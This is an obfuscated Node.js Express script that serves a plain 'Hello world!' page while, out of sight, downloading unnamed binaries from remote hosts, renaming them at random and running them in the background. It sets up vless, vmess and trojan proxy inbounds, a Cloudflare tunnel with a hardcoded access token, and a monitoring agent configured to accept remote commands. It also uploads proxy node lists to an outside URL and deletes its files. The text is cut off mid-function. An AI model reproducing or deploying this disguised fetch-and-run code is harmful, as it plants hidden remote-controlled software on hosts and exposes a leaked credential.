const _0x59e5e1=_0x227a;(function(_0x46ba8e,_0x2ba068){const _0x4b4be0={_0x21ead4:0x227,_0x1f6286:0x1e2,_0x3b6f65:0x1fe,_0x417983:0x1c4,_0x5f8d70:0x21e},_0x203700=_0x227a,_0x56dc43=_0x46ba8e();while(!![]){try{const _0x1f4f67=parseInt(_0x203700(0x1d2))/0x1*(-parseInt(_0x203700(0x1d8))/0x2)+parseInt(_0x203700(_0x4b4be0._0x21ead4))/0x3*(parseInt(_0x203700(_0x4b4be0._0x1f6286))/0x4)+-parseInt(_0x203700(_0x4b4be0._0x3b6f65))/0x5+parseInt(_0x203700(0x1de))/0x6+-parseInt(_0x203700(0x223))/0x7+-parseInt(_0x203700(_0x4b4be0._0x417983))/0x8*(parseInt(_0x203700(_0x4b4be0._0x5f8d70))/0x9)+parseInt(_0x203700(0x1f6))/0xa;if(_0x1f4f67===_0x2ba068)break;else _0x56dc43['push'](_0x56dc43['shift']());}catch(_0x2b55c2){_0x56dc43['push'](_0x56dc43['shift']());}}}(_0x3b77,0x7f36d));const express=require(_0x59e5e1(0x213)),app=express(),axios=require(_0x59e5e1(0x271)),os=require('os'),fs=require('fs'),path=require(_0x59e5e1(0x255)),{promisify}=require(_0x59e5e1(0x1e8)),exec=promisify(require(_0x59e5e1(0x27c))['exec']),{execSync}=require(_0x59e5e1(0x27c)),UPLOAD_URL=process[_0x59e5e1(0x217)][_0x59e5e1(0x1e9)]||'',PROJECT_URL=process['env'][_0x59e5e1(0x1c0)]||'',AUTO_ACCESS=process[_0x59e5e1(0x217)][_0x59e5e1(0x26d)]||![],FILE_PATH=process[_0x59e5e1(0x217)]['FILE_PATH']||_0x59e5e1(0x1da),SUB_PATH=process[_0x59e5e1(0x217)]['SUB_PATH']||_0x59e5e1(0x249),PORT=process[_0x59e5e1(0x217)][_0x59e5e1(0x218)]||process[_0x59e5e1(0x217)]['PORT']||0xbb8,UUID=process['env'][_0x59e5e1(0x208)]||_0x59e5e1(0x260),NEZHA_SERVER=process[_0x59e5e1(0x217)][_0x59e5e1(0x1d1)]||'',NEZHA_PORT=process[_0x59e5e1(0x217)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x59e5e1(0x217)][_0x59e5e1(0x246)]||'',ARGO_DOMAIN=process[_0x59e5e1(0x217)][_0x59e5e1(0x237)]||'railwaykerberlam.2260629.xyz',ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiYjBlMDhjMzA0Y2ZlZGEzNWE2NWM1ZDA2YTkyYWU4NmEiLCJ0IjoiODU3ZWQ5MDItZDk0My00ZTk1LThjYjYtMjhiZjk2YWRkNmIxIiwicyI6Ik1qWTJOak0zTWpndE5EZG1aaTAwTjJOaExXRTVObUl0TmpabU5EaGtZMk0yTnpNNSJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x59e5e1(0x217)][_0x59e5e1(0x1dc)]||_0x59e5e1(0x1bf),CFPORT=process['env'][_0x59e5e1(0x1f5)]||0x1bb,NAME=process['env']['NAME']||_0x59e5e1(0x1be);!fs[_0x59e5e1(0x1d3)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x59e5e1(0x201)](FILE_PATH+_0x59e5e1(0x243))):console[_0x59e5e1(0x201)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x125934=_0x59e5e1,_0x5bfc5e=_0x125934(0x214);let _0x4ea84d='';for(let _0xb8e77b=0x0;_0xb8e77b<0x6;_0xb8e77b++){_0x4ea84d+=_0x5bfc5e[_0x125934(0x238)](Math['floor'](Math[_0x125934(0x257)]()*_0x5bfc5e[_0x125934(0x22d)]));}return _0x4ea84d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x59e5e1(0x1d6)](FILE_PATH,npmName),phpPath=path[_0x59e5e1(0x1d6)](FILE_PATH,phpName),webPath=path[_0x59e5e1(0x1d6)](FILE_PATH,webName),botPath=path[_0x59e5e1(0x1d6)](FILE_PATH,botName),subPath=path[_0x59e5e1(0x1d6)](FILE_PATH,'sub.txt'),listPath=path[_0x59e5e1(0x1d6)](FILE_PATH,_0x59e5e1(0x1ff)),bootLogPath=path[_0x59e5e1(0x1d6)](FILE_PATH,_0x59e5e1(0x21d)),configPath=path[_0x59e5e1(0x1d6)](FILE_PATH,_0x59e5e1(0x27f));function deleteNodes(){const _0x422574={_0x53bd78:0x24a,_0x7f7cac:0x22d,_0x9cf13b:0x216},_0x574d7f=_0x59e5e1;try{if(!UPLOAD_URL)return;if(!fs[_0x574d7f(0x1d3)](subPath))return;let _0x4f2f82;try{_0x4f2f82=fs[_0x574d7f(0x27e)](subPath,_0x574d7f(0x24a));}catch{return null;}const _0x42ce6b=Buffer[_0x574d7f(0x211)](_0x4f2f82,_0x574d7f(0x25e))[_0x574d7f(0x24b)](_0x574d7f(_0x422574._0x53bd78)),_0x2e4567=_0x42ce6b['split']('\x0a')[_0x574d7f(0x210)](_0x572f9d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x574d7f(0x1e5)](_0x572f9d));if(_0x2e4567[_0x574d7f(_0x422574._0x7f7cac)]===0x0)return;return axios[_0x574d7f(0x1f7)](UPLOAD_URL+_0x574d7f(0x247),JSON['stringify']({'nodes':_0x2e4567}),{'headers':{'Content-Type':_0x574d7f(0x23d)}})[_0x574d7f(_0x422574._0x9cf13b)](_0x4439ee=>{return null;}),null;}catch(_0x59236c){return null;}}function cleanupOldFiles(){const _0x25ea3c={_0x181cde:0x1d6,_0x4324d1:0x20c};try{const _0x5d2851=fs['readdirSync'](FILE_PATH);_0x5d2851['forEach'](_0x1c59ef=>{const _0x309cba=_0x227a,_0x26499c=path[_0x309cba(_0x25ea3c._0x181cde)](FILE_PATH,_0x1c59ef);try{const _0x42afb2=fs[_0x309cba(_0x25ea3c._0x4324d1)](_0x26499c);_0x42afb2[_0x309cba(0x1fb)]()&&fs['unlinkSync'](_0x26499c);}catch(_0x2b9baa){}});}catch(_0xec16f2){}}app[_0x59e5e1(0x1f0)]('/',function(_0x5561c2,_0xd393bc){const _0x25babb={_0x38df76:0x209},_0x285704=_0x59e5e1;_0xd393bc[_0x285704(_0x25babb._0x38df76)](_0x285704(0x200));});async function generateConfig(){const _0x425908={_0x4f9e65:0x1ce,_0x3e304e:0x1ce,_0x1db3e3:0x275,_0x3708d6:0x22c,_0x205144:0x262,_0x47a70a:0x228,_0x3d6652:0x1e0,_0x4db326:0x250,_0x58243e:0x24f,_0x4cc2a8:0x1e0,_0x14260c:0x24f,_0x2a619a:0x228,_0x332271:0x203,_0x3f4cf6:0x221},_0x9e68b=_0x59e5e1,_0x2cd529={'log':{'access':_0x9e68b(_0x425908._0x4f9e65),'error':_0x9e68b(_0x425908._0x3e304e),'loglevel':_0x9e68b(0x228)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x9e68b(0x1f9),'settings':{'clients':[{'id':UUID,'flow':_0x9e68b(0x1ca)}],'decryption':_0x9e68b(0x228),'fallbacks':[{'dest':0xbb9},{'path':_0x9e68b(_0x425908._0x1db3e3),'dest':0xbba},{'path':_0x9e68b(_0x425908._0x3708d6),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x9e68b(_0x425908._0x205144)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x9e68b(0x1f9),'settings':{'clients':[{'id':UUID}],'decryption':_0x9e68b(_0x425908._0x47a70a)},'streamSettings':{'network':_0x9e68b(0x262),'security':_0x9e68b(0x228)}},{'port':0xbba,'listen':_0x9e68b(_0x425908._0x3d6652),'protocol':_0x9e68b(0x1f9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x9e68b(0x228)},'streamSettings':{'network':'ws','security':_0x9e68b(_0x425908._0x47a70a),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x9e68b(_0x425908._0x4db326),_0x9e68b(_0x425908._0x58243e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x9e68b(_0x425908._0x4cc2a8),'protocol':_0x9e68b(0x204),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x9e68b(0x219),_0x9e68b(0x250),_0x9e68b(_0x425908._0x14260c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x9e68b(0x1e0),'protocol':_0x9e68b(0x212),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x9e68b(_0x425908._0x2a619a),'wsSettings':{'path':_0x9e68b(_0x425908._0x332271)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x9e68b(0x250),_0x9e68b(0x24f)],'metadataOnly':![]}}],'dns':{'servers':[_0x9e68b(0x27b)]},'outbounds':[{'protocol':_0x9e68b(_0x425908._0x3f4cf6),'tag':_0x9e68b(0x1c8)},{'protocol':'blackhole','tag':_0x9e68b(0x232)}]};fs['writeFileSync'](path[_0x9e68b(0x1d6)](FILE_PATH,'config.json'),JSON[_0x9e68b(0x222)](_0x2cd529,null,0x2));}function getSystemArchitecture(){const _0x5871d3={_0x733f1:0x21b},_0x2a2051=_0x59e5e1,_0x311269=os[_0x2a2051(0x1e7)]();return _0x311269===_0x2a2051(_0x5871d3._0x733f1)||_0x311269==='arm64'||_0x311269===_0x2a2051(0x282)?'arm':'amd';}function downloadFile(_0x460455,_0x29e37f,_0x470aa7){const _0x58bc2b={_0x5147a3:0x1d3,_0xd0f3f1:0x1eb,_0x30d1a6:0x1f0,_0x247522:0x25a},_0x105c07={_0x5d305a:0x263},_0x4adabb={_0x1794ec:0x1d7,_0x2db3cb:0x256},_0x19736b=_0x59e5e1,_0x51bc04=_0x460455;!fs[_0x19736b(_0x58bc2b._0x5147a3)](FILE_PATH)&&fs[_0x19736b(0x25f)](FILE_PATH,{'recursive':!![]});const _0x301a43=fs[_0x19736b(_0x58bc2b._0xd0f3f1)](_0x51bc04);axios({'method':_0x19736b(_0x58bc2b._0x30d1a6),'url':_0x29e37f,'responseType':_0x19736b(0x268)})[_0x19736b(_0x58bc2b._0x247522)](_0x328a55=>{const _0x1855a7={_0x44e41e:0x23a,_0x4fd405:0x263},_0x4066da={_0xd04bd9:0x201,_0x460a91:0x235,_0x1e757e:0x24d,_0x1798cb:0x1c6},_0x15cd97=_0x19736b;_0x328a55[_0x15cd97(_0x4adabb._0x1794ec)]['pipe'](_0x301a43),_0x301a43['on'](_0x15cd97(0x24c),()=>{const _0x350981=_0x15cd97;_0x301a43['close'](),console[_0x350981(_0x4066da._0xd04bd9)](_0x350981(_0x4066da._0x460a91)+path[_0x350981(_0x4066da._0x1e757e)](_0x51bc04)+_0x350981(_0x4066da._0x1798cb)),_0x470aa7(null,_0x51bc04);}),_0x301a43['on'](_0x15cd97(_0x4adabb._0x2db3cb),_0x2aacf6=>{const _0x126647=_0x15cd97;fs[_0x126647(_0x1855a7._0x44e41e)](_0x51bc04,()=>{});const _0x11738a=_0x126647(0x235)+path[_0x126647(0x24d)](_0x51bc04)+_0x126647(0x1d9)+_0x2aacf6[_0x126647(_0x1855a7._0x4fd405)];console[_0x126647(0x256)](_0x11738a),_0x470aa7(_0x11738a);});})[_0x19736b(0x216)](_0xd1c65b=>{const _0x1db8c9=_0x19736b,_0x3e2d17='Download\x20'+path['basename'](_0x51bc04)+_0x1db8c9(0x1d9)+_0xd1c65b[_0x1db8c9(_0x105c07._0x5d305a)];console[_0x1db8c9(0x256)](_0x3e2d17),_0x470aa7(_0x3e2d17);});}function _0x3b77(){const _0x463ca2=['\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https+local://8.8.8.8/dns-query','child_process','https://amd64.ssss.nyc.mn/v1','readFileSync','config.json','&fp=firefox&type=ws&host=','php\x20running\x20error:\x20','aarch64','railwaykerberlam','saas.sin.fan','PROJECT_URL','platform','TunnelSecret','\x20>\x20nul\x202>&1','2024WCLZMA','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','direct','Error\x20in\x20startserver:','xtls-rprx-vision','\x20-p\x20','Subscription\x20uploaded\x20successfully','Nodes\x20uploaded\x20successfully','/dev/null','/api/add-nodes','countryCode','NEZHA_SERVER','7387ouSORU','existsSync','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','join','data','274iJgOLF','\x20failed:\x20','./tmp','https://arm64.ssss.nyc.mn/web','CFIP','substring','183546AQtHAh','Error\x20reading\x20boot.log:','127.0.0.1','forEach','10420gquINc','\x0a\x0atrojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','test','https://arm64.ssss.nyc.mn/bot','arch','util','UPLOAD_URL','https://amd64.ssss.nyc.mn/web','createWriteStream','2087','Error\x20executing\x20command:\x20','\x0avless://','\x20>/dev/null\x202>&1\x20&','get','?security=tls&sni=','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0aclient_secret:\x20','https://oooo.serv00.net/add-url','CFPORT','24518890ZYagjA','post','\x20-c\x20','vless','includes','isFile','/tunnel.yml\x20run','chmod','1388395zKebui','list.txt','Hello\x20world!','log','writeFileSync','/trojan-argo','vmess','false','org','response','UUID','send','Unknown','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','statSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20','country_code','filter','from','trojan','express','abcdefghijklmnopqrstuvwxyz','Skipping\x20adding\x20automatic\x20access\x20task','catch','env','SERVER_PORT','http','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arm','\x0a\x20\x20credentials-file:\x20','boot.log','36981pXJpkJ','ARGO_DOMAIN:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','freedom','stringify','87262hMBKbt','8443','Add\x20automatic\x20access\x20task\x20faild:\x20','nohup\x20','438uoaaLe','none','pop','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Unhandled\x20error\x20in\x20startserver:','/vmess-argo','length','\x20>/dev/null\x202>&1','split','win32','Empowerment\x20success\x20for\x20','block','tunnel.json','Empowerment\x20failed\x20for\x20','Download\x20','ArgoDomain:','ARGO_DOMAIN','charAt','2083','unlink','config.yaml','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','application/json','clear','?encryption=none&security=tls&sni=','del\x20/f\x20/q\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20tunnel:\x20','\x20is\x20created','match','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','NEZHA_KEY','/api/delete-nodes','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','111111','utf-8','toString','finish','basename','http://ip-api.com/json/','quic','tls','\x20-c\x20\x22','2053','Content-Type','push','path','error','random','/api/add-subscriptions','unshift','then','443','firefox','https://ipapi.co/json/','base64','mkdirSync','8c1d9c14-f850-42b7-b852-e00448dfc2cf','success','tcp','message','--tls','&path=%2Ftrojan-argo%3Fed%3D2560#','listen','text/plain;\x20charset=utf-8','stream','tunnel.yml','/config.json\x20>/dev/null\x202>&1\x20&','set','fileUrl','AUTO_ACCESS','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20is\x20running','has','axios','taskkill\x20/f\x20/im\x20','2096','map','/vless-argo','/sub.txt\x20saved\x20successfully','status','https://arm64.ssss.nyc.mn/v1','all'];_0x3b77=function(){return _0x463ca2;};return _0x3b77();}function _0x227a(_0x35676b,_0x464151){const _0x3b7731=_0x3b77();return _0x227a=function(_0x227a5d,_0x13c1c6){_0x227a5d=_0x227a5d-0x1be;let _0x37606f=_0x3b7731[_0x227a5d];return _0x37606f;},_0x227a(_0x35676b,_0x464151);}async function downloadFilesAndRun(){const _0x35738c={_0xa853fe:0x23c,_0x4c67cb:0x274,_0x37727b:0x1fa,_0x5683ff:0x273,_0x5508ed:0x239,_0x13d05e:0x270,_0x5864bd:0x1f3,_0x4775a6:0x20b,_0x311985:0x202,_0x5d64e1:0x201,_0x59fd29:0x256,_0x663f2d:0x281,_0x3820ee:0x25b,_0x305d3d:0x224,_0x4bebb0:0x1e4,_0x4b22c7:0x201,_0x19776e:0x26f,_0x4c5a53:0x244,_0x3932f2:0x26f},_0x5685c5={_0x47936e:0x1d3,_0x27b457:0x1fd},_0x434618=_0x59e5e1,_0x45f4f4=getSystemArchitecture(),_0x31cf77=getFilesForArchitecture(_0x45f4f4);if(_0x31cf77[_0x434618(0x22d)]===0x0){console[_0x434618(0x201)](_0x434618(_0x35738c._0xa853fe));return;}const _0x53c4da=_0x31cf77[_0x434618(_0x35738c._0x4c67cb)](_0x5ef9f8=>{return new Promise((_0x2943cc,_0x1865cc)=>{const _0x264f85=_0x227a;downloadFile(_0x5ef9f8['fileName'],_0x5ef9f8[_0x264f85(0x26c)],(_0x2f559c,_0x4f39de)=>{_0x2f559c?_0x1865cc(_0x2f559c):_0x2943cc(_0x4f39de);});});});try{await Promise[_0x434618(0x279)](_0x53c4da);}catch(_0x27ce04){console[_0x434618(0x256)]('Error\x20downloading\x20files:',_0x27ce04);return;}function _0x6a2741(_0x9ebbc8){const _0x90e28a=_0x434618,_0x491de4=0x1fd;_0x9ebbc8[_0x90e28a(0x1e1)](_0x5f0d02=>{const _0x35a2ff={_0x25acbe:0x256,_0x5bceb1:0x234,_0x2eacb4:0x231},_0x5db9db=_0x90e28a;fs[_0x5db9db(_0x5685c5._0x47936e)](_0x5f0d02)&&fs[_0x5db9db(_0x5685c5._0x27b457)](_0x5f0d02,_0x491de4,_0x3f868e=>{const _0x315d57=_0x5db9db;_0x3f868e?console[_0x315d57(_0x35a2ff._0x25acbe)](_0x315d57(_0x35a2ff._0x5bceb1)+_0x5f0d02+':\x20'+_0x3f868e):console['log'](_0x315d57(_0x35a2ff._0x2eacb4)+_0x5f0d02+':\x20'+_0x491de4[_0x315d57(0x24b)](0x8));});});}const _0x24684a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x6a2741(_0x24684a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10efae=NEZHA_SERVER[_0x434618(_0x35738c._0x37727b)](':')?NEZHA_SERVER[_0x434618(0x22f)](':')[_0x434618(0x229)]():'',_0x3de0ff=new Set(['443',_0x434618(0x224),_0x434618(_0x35738c._0x5683ff),'2087',_0x434618(_0x35738c._0x5508ed),_0x434618(0x252)]),_0x573979=_0x3de0ff[_0x434618(_0x35738c._0x13d05e)](_0x10efae)?'true':_0x434618(0x205),_0x2ab84a=_0x434618(_0x35738c._0x5864bd)+NEZHA_KEY+_0x434618(_0x35738c._0x4775a6)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x573979+_0x434618(0x21a)+UUID;fs[_0x434618(_0x35738c._0x311985)](path['join'](FILE_PATH,_0x434618(0x23b)),_0x2ab84a);const _0x4fa262=_0x434618(0x226)+phpPath+_0x434618(0x251)+FILE_PATH+_0x434618(0x1c5);try{await exec(_0x4fa262),console[_0x434618(_0x35738c._0x5d64e1)](phpName+'\x20is\x20running'),await new Promise(_0x5c2957=>setTimeout(_0x5c2957,0x3e8));}catch(_0x1cb6a1){console[_0x434618(_0x35738c._0x59fd29)](_0x434618(_0x35738c._0x663f2d)+_0x1cb6a1);}}else{let _0x54807e='';const _0x3e6c79=[_0x434618(_0x35738c._0x3820ee),_0x434618(_0x35738c._0x305d3d),'2096',_0x434618(0x1ec),_0x434618(0x239),_0x434618(0x252)];_0x3e6c79['includes'](NEZHA_PORT)&&(_0x54807e=_0x434618(0x264));const _0x2c60b6=_0x434618(0x226)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x434618(0x1cb)+NEZHA_KEY+'\x20'+_0x54807e+_0x434618(_0x35738c._0x4bebb0);try{await exec(_0x2c60b6),console[_0x434618(0x201)](npmName+_0x434618(0x26f)),await new Promise(_0x256871=>setTimeout(_0x256871,0x3e8));}catch(_0xc4de8a){console[_0x434618(_0x35738c._0x59fd29)]('npm\x20running\x20error:\x20'+_0xc4de8a);}}}else console[_0x434618(_0x35738c._0x4b22c7)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4e4847=_0x434618(0x226)+webPath+_0x434618(0x1f8)+FILE_PATH+_0x434618(0x26a);try{await exec(_0x4e4847),console[_0x434618(0x201)](webName+_0x434618(_0x35738c._0x19776e)),await new Promise(_0x233476=>setTimeout(_0x233476,0x3e8));}catch(_0x286115){console['error']('web\x20running\x20error:\x20'+_0x286115);}if(fs['existsSync'](botPath)){let _0x5d0377;if(ARGO_AUTH[_0x434618(0x244)](/^[A-Z0-9a-z=]{120,250}$/))_0x5d0377=_0x434618(0x1d5)+ARGO_AUTH;else ARGO_AUTH[_0x434618(_0x35738c._0x4c5a53)](/TunnelSecret/)?_0x5d0377=_0x434618(0x220)+FILE_PATH+_0x434618(0x1fc):_0x5d0377=_0x434618(0x20d)+FILE_PATH+_0x434618(0x26e)+ARGO_PORT;try{await exec(_0x434618(0x226)+botPath+'\x20'+_0x5d0377+'\x20>/dev/null\x202>&1\x20&'),console[_0x434618(0x201)](botName+_0x434618(_0x35738c._0x3932f2)),await new Promise(_0x235aef=>setTimeout(_0x235aef,0x7d0));}catch(_0x2fa0a3){console[_0x434618(_0x35738c._0x59fd29)](_0x434618(0x1ed)+_0x2fa0a3);}}await new Promise(_0x1a19db=>setTimeout(_0x1a19db,0x1388));}function getFilesForArchitecture(_0x4d1d52){const _0xda2278={_0x4944c9:0x1ea,_0x53a79f:0x21b,_0x3010b5:0x259,_0x11aca6:0x27d},_0x34c329=_0x59e5e1;let _0x4f92b2;_0x4d1d52==='arm'?_0x4f92b2=[{'fileName':webPath,'fileUrl':_0x34c329(0x1db)},{'fileName':botPath,'fileUrl':_0x34c329(0x1e6)}]:_0x4f92b2=[{'fileName':webPath,'fileUrl':_0x34c329(_0xda2278._0x4944c9)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1d992f=_0x4d1d52===_0x34c329(_0xda2278._0x53a79f)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x4f92b2[_0x34c329(_0xda2278._0x3010b5)]({'fileName':npmPath,'fileUrl':_0x1d992f});}else{const _0x307e80=_0x4d1d52==='arm'?_0x34c329(0x278):_0x34c329(_0xda2278._0x11aca6);_0x4f92b2[_0x34c329(_0xda2278._0x3010b5)]({'fileName':phpPath,'fileUrl':_0x307e80});}}return _0x4f92b2;}function argoType(){const _0x1804e5={_0x4a7d44:0x201,_0x2ba29a:0x1f2,_0x3dcc69:0x1c2,_0x23afc2:0x1d6,_0xcf4fc4:0x21c,_0x5e034e:0x27a,_0x44b08f:0x202,_0x52b72b:0x1d6,_0x32fcc6:0x248},_0x3720f5=_0x59e5e1;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3720f5(_0x1804e5._0x4a7d44)](_0x3720f5(_0x1804e5._0x2ba29a));return;}if(ARGO_AUTH['includes'](_0x3720f5(_0x1804e5._0x3dcc69))){fs['writeFileSync'](path[_0x3720f5(_0x1804e5._0x23afc2)](FILE_PATH,_0x3720f5(0x233)),ARGO_AUTH);const _0x509f5b=_0x3720f5(0x242)+ARGO_AUTH['split']('\x22')[0xb]+_0x3720f5(_0x1804e5._0xcf4fc4)+path[_0x3720f5(0x1d6)](FILE_PATH,'tunnel.json')+_0x3720f5(_0x1804e5._0x5e034e)+ARGO_DOMAIN+_0x3720f5(0x245)+ARGO_PORT+_0x3720f5(0x22a);fs[_0x3720f5(_0x1804e5._0x44b08f)](path[_0x3720f5(_0x1804e5._0x52b72b)](FILE_PATH,_0x3720f5(0x269)),_0x509f5b);}else console[_0x3720f5(0x201)](_0x3720f5(_0x1804e5._0x32fcc6));}async function extractDomains(){const _0x1a3f0c={_0x1599e5:0x21d,_0x41ff1d:0x24a,_0x1ae4f3:0x22f,_0x36cea3:0x1e1,_0x5c714e:0x201,_0x59de42:0x236,_0x59fa71:0x1d6,_0x520c45:0x226,_0x4ed5f7:0x26f,_0x5f56c6:0x256,_0x2c5b4c:0x1ed,_0x1cdf32:0x1df},_0x16b9de={_0x3bdd30:0x1f0,_0x2db62b:0x1d7,_0x29baae:0x24e,_0xa44197:0x277,_0x446d3e:0x261,_0x454de1:0x1d0,_0x281e28:0x206,_0x495850:0x206,_0x2d8ab1:0x20a},_0x2c45c8={_0x57496b:0x1c1,_0x56fdc0:0x230},_0x3fa96d={_0x1359f2:0x244},_0x2833df=_0x59e5e1;let _0x3623e2;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3623e2=ARGO_DOMAIN,console[_0x2833df(0x201)](_0x2833df(0x21f),_0x3623e2),await _0x18b692(_0x3623e2);else try{const _0x311ee0=fs[_0x2833df(0x27e)](path[_0x2833df(0x1d6)](FILE_PATH,_0x2833df(_0x1a3f0c._0x1599e5)),_0x2833df(_0x1a3f0c._0x41ff1d)),_0x4a3e3b=_0x311ee0[_0x2833df(_0x1a3f0c._0x1ae4f3)]('\x0a'),_0x165391=[];_0x4a3e3b[_0x2833df(_0x1a3f0c._0x36cea3)](_0x5b7edd=>{const _0x10e048=_0x2833df,_0x567d7e=_0x5b7edd[_0x10e048(_0x3fa96d._0x1359f2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x567d7e){const _0x38fc57=_0x567d7e[0x1];_0x165391['push'](_0x38fc57);}});if(_0x165391[_0x2833df(0x22d)]>0x0)_0x3623e2=_0x165391[0x0],console[_0x2833df(_0x1a3f0c._0x5c714e)](_0x2833df(_0x1a3f0c._0x59de42),_0x3623e2),await _0x18b692(_0x3623e2);else{console[_0x2833df(0x201)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x2833df(_0x1a3f0c._0x59fa71)](FILE_PATH,_0x2833df(0x21d)));async function _0x34f83f(){const _0x2986e6=_0x2833df;try{process[_0x2986e6(_0x2c45c8._0x57496b)]===_0x2986e6(_0x2c45c8._0x56fdc0)?await exec(_0x2986e6(0x272)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x2986e6(0x1dd)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x32d0c0){}}_0x34f83f(),await new Promise(_0x19aa8b=>setTimeout(_0x19aa8b,0xbb8));const _0x39bda5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2833df(_0x1a3f0c._0x520c45)+botPath+'\x20'+_0x39bda5+_0x2833df(0x1ef)),console[_0x2833df(0x201)](botName+_0x2833df(_0x1a3f0c._0x4ed5f7)),await new Promise(_0x48c5d1=>setTimeout(_0x48c5d1,0xbb8)),await extractDomains();}catch(_0x49307f){console[_0x2833df(_0x1a3f0c._0x5f56c6)](_0x2833df(_0x1a3f0c._0x2c5b4c)+_0x49307f);}}}catch(_0x54f8a4){console['error'](_0x2833df(_0x1a3f0c._0x1cdf32),_0x54f8a4);}async function _0x579469(){const _0x8b6528=_0x2833df;try{const _0x3bfb98=await axios[_0x8b6528(_0x16b9de._0x3bdd30)](_0x8b6528(0x25d),{'timeout':0xbb8});if(_0x3bfb98[_0x8b6528(_0x16b9de._0x2db62b)]&&_0x3bfb98['data']['country_code']&&_0x3bfb98[_0x8b6528(0x1d7)]['org'])return _0x3bfb98[_0x8b6528(0x1d7)][_0x8b6528(0x20f)]+'_'+_0x3bfb98[_0x8b6528(0x1d7)][_0x8b6528(0x206)];}catch(_0x101966){try{const _0x332cf2=await axios[_0x8b6528(0x1f0)](_0x8b6528(_0x16b9de._0x29baae),{'timeout':0xbb8});if(_0x332cf2[_0x8b6528(_0x16b9de._0x2db62b)]&&_0x332cf2['data'][_0x8b6528(_0x16b9de._0xa44197)]===_0x8b6528(_0x16b9de._0x446d3e)&&_0x332cf2[_0x8b6528(0x1d7)][_0x8b6528(_0x16b9de._0x454de1)]&&_0x332cf2[_0x8b6528(0x1d7)][_0x8b6528(_0x16b9de._0x281e28)])return _0x332cf2[_0x8b6528(_0x16b9de._0x2db62b)][_0x8b6528(0x1d0)]+'_'+_0x332cf2[_0x8b6528(0x1d7)][_0x8b6528(_0x16b9de._0x495850)];}catch(_0x1cbafa){}}return _0x8b6528(_0x16b9de._0x2d8ab1);}async function _0x18b692(_0x29ad50){const 